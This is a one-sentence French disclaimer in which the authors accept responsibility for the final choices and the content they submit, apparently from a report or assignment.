Les choix finaux et le contenu remis relèvent de notre responsabilité.
